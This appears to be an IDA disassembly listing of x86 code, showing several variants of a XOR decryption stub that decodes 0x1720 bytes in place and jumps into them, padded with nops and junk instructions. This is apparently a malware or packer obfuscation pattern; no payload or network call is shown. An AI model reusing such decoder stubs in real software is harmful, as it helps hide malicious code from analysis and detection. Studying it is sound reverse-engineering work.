.text:004026BA ; =============== S U B R O U T I N E =======================================
.text:004026BA
.text:004026BA
.text:004026BA sub_4026BA      proc near               ; DATA XREF: sub_40268D+20\u2191o
.text:004026BA
.text:004026BA arg_0           = dword ptr  4
.text:004026BA
.text:004026BA                 pop     edx
.text:004026BB                 nop
.text:004026BC                 mov     edx, [edx]
.text:004026BE                 nop
.text:004026BF                 xor     [esp-4+arg_0], edx
.text:004026C2                 nop
.text:004026C3                 mov     ecx, 1720h
.text:004026C8                 nop
.text:004026C9                 mov     esi, [esp-4+arg_0]
.text:004026CC                 nop
.text:004026CD
.text:004026CD loc_4026CD:                             ; CODE XREF: sub_4026BA+18\u2193j
.text:004026CD                 xor     [esi], edx
.text:004026CF                 nop
.text:004026D0                 inc     esi
.text:004026D1                 nop
.text:004026D2                 loop    loc_4026CD
.text:004026D4                 nop
.text:004026D5                 retn
.text:004026D5 sub_4026BA      endp ; sp-analysis failed
.text:004026D5
.text:004026D5 ; ---------------------------------------------------------------------------
.text:004026D6                 db 90h
.text:004026D7 ; ---------------------------------------------------------------------------
.text:004026D7                 mov     edx, [esp]
.text:004026DA                 add     esp, 4
.text:004026DD                 push    dword ptr [edx]
.text:004026DF                 pop     edx
.text:004026E0                 mov     edi, esp
.text:004026E2                 xor     [edi], edx
.text:004026E4                 push    1720h
.text:004026E9                 pop     ecx
.text:004026EA                 pop     esi
.text:004026EB                 push    esi
.text:004026EC
.text:004026EC loc_4026EC:                             ; CODE XREF: .text:004026F4\u2193j
.text:004026EC                 mov     edi, edx
.text:004026EE                 xor     [esi], edi
.text:004026F0                 add     esi, 1
.text:004026F3                 nop
.text:004026F4                 loop    loc_4026EC
.text:004026F6                 nop
.text:004026F7                 pop     ebp
.text:004026F8                 jmp     ebp
.text:004026FA ; ---------------------------------------------------------------------------
.text:004026FA                 pop     ecx
.text:004026FB                 mov     edx, ecx
.text:004026FD                 mov     ecx, [edx]
.text:004026FF                 mov     edx, ecx
.text:00402701                 mov     edi, esp
.text:00402703                 xor     [edi], edx
.text:00402705                 xor     ecx, ecx
.text:00402707                 add     ecx, 1720h
.text:0040270D                 mov     ebx, [edi]
.text:0040270F                 xchg    ebx, esi
.text:00402711
.text:00402711 loc_402711:                             ; CODE XREF: .text:00402719\u2193j
.text:00402711                 mov     eax, edx
.text:00402713                 xor     [esi], eax
.text:00402715                 adc     esi, 1
.text:00402718                 cld
.text:00402719                 loop    loc_402711
.text:0040271B                 xchg    ecx, ecx
.text:0040271D                 pop     edx
.text:0040271E                 jmp     edx
.text:0040271E ; ---------------------------------------------------------------------------
.text:00402720                 align 100h
.text:00402800                 dd 200h dup(?)
.text:00402800 _text           ends
.text:00402800
.text:00402800
.text:00402800                 end start
